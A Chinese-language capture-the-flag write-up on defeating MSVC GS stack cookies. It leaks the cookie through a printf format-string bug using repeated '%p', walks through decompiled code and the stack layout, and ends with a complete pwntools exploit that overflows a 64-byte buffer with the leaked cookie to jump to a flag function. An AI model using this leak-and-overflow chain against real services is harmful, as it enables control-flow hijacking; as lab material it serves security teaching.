# 系统层漏洞利用与逆向分析-GS缓冲区安全检查利用-G2 WriteUp

G2使用了另一种方法来获取cookie。

当调用`printf`时，参数从右到左入栈，`printf`函数会从栈中取出参数并进行格式化输出。通过传入格式化字符串`%p`，可以打印出栈中的值，从而泄露出栈上的cookie。

来看一下漏洞代码反编译结果，部分函数和变量进行了重命名：

```c
undefined4 FUN_00401020(void)

{
  undefined *puVar1;
  FILE *pFVar2;
  undefined4 uVar3;
  int iVar4;
  int iVar5;
  char buff256 [256];
  undefined1 buff64 [64];
  uint secure_cookie;
  
  secure_cookie = global_cookie ^ (uint)&stack0xfffffffc;
  iVar5 = 0;
  iVar4 = 4;
  uVar3 = 0;
  puVar1 = open(0);
  FUN_004046ab((int)puVar1,uVar3,iVar4,iVar5);
  iVar5 = 0;
  iVar4 = 4;
  uVar3 = 0;
  puVar1 = open(1);
  FUN_004046ab((int)puVar1,uVar3,iVar4,iVar5);
  iVar5 = 0;
  iVar4 = 4;
  uVar3 = 0;
  puVar1 = open(2);
  FUN_004046ab((int)puVar1,uVar3,iVar4,iVar5);
  print(0x41d000);
  print(0x41d010);
  pFVar2 = (FILE *)open(0);
  FUN_004043f5(buff256,0x100,pFVar2);
  print((int)buff256);
  print(0x41d020);
  FUN_004064fe(buff64);
  print(0x41d030);
  return 0;
}
```

以上代码中，`FUN_004043f5`函数会从标准输入读取256字节的数据到长度为256字节的缓冲区中，作为下一个`printf`的参数。

同时，查看栈分配情况：

```
                             *************************************************************
                             *                           FUNCTION                         
                             *************************************************************
                               undefined4  __stdcall  FUN_00401020 (void )
                               assume FS_OFFSET = 0xffdff000
             undefined4        EAX:4          <RETURN>
             undefined4        Stack[-0x8]:4  secure_cookie                           XREF[2]:     00401030 (W) , 
                                                                                                   004010f6 (R)   
             undefined1[64]    Stack[-0x48]   buff64                                  XREF[3]:     0040107e (*) , 
                                                                                                   004010d7 (*) , 
                                                                                                   004010e3 (*)   
             undefined1[256]   Stack[-0x148   buff256                                 XREF[2]:     004010ac (*) , 
                                                                                                   004010bb (*)   
                             FUN_00401020                                    XREF[1]:     FUN_0040125d:00401355 (c)   
        00401020 55              PUSH       EBP
```

作为格式化字符串的参数`buff256`位于Stack[-0x148]，而栈上的cookie位于Stack[-0x8]，每个`%p`读取栈上四个字节，因此第`(0x148 - 0x8) / 4`个`%p`的输出就是栈上cookie。

## 代码

```python
from pwn import *

r = remote('172.17.243.199', 9999)

GET_FLAG = 0x00401000
FMT_TO_COOKIE = int((0x148 - 0x8) / 4)

banner = r.recvuntil(b': ')
print(banner.decode(errors='replace'))
# Format 获取 cookie
r.sendline(b'%p ' * 81)
line = r.recvline().decode().split()
cookie = line[FMT_TO_COOKIE]
stack_cookie = int(cookie, 16) 
print(f"stack_cookie: {hex(stack_cookie)}")

# 利用缓冲区溢出漏洞
payload = b'A' * 64 + p32(stack_cookie) + p32(0xdeadbeef) + p32(GET_FLAG)

r.sendline(payload)

try:
    data = r.recvall(timeout=5)
    log.info(f"Received:\n{data.decode(errors='replace')}")
except:
    data = r.recv(timeout=3)
    log.info(f"Received:\n{data.decode(errors='replace')}")
```